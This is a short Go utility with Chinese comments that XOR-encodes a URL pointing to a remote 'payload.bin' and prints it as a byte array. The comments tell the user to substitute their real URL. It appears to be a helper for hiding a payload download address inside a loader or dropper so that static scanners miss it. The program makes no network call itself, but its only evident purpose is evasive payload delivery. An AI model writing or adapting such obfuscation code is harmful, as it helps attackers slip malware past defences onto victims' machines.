package main
import "fmt"

func main() {
	// 把这里换成你的真实 URL
	url := "https://api.cailiu666.xyz/payload.bin" 
	key := byte(0x88) // 简单的 XOR 密钥

	fmt.Print("{")
	for i := 0; i < len(url); i++ {
		fmt.Printf("0x%x, ", url[i]^key)
	}
	fmt.Println("}")
}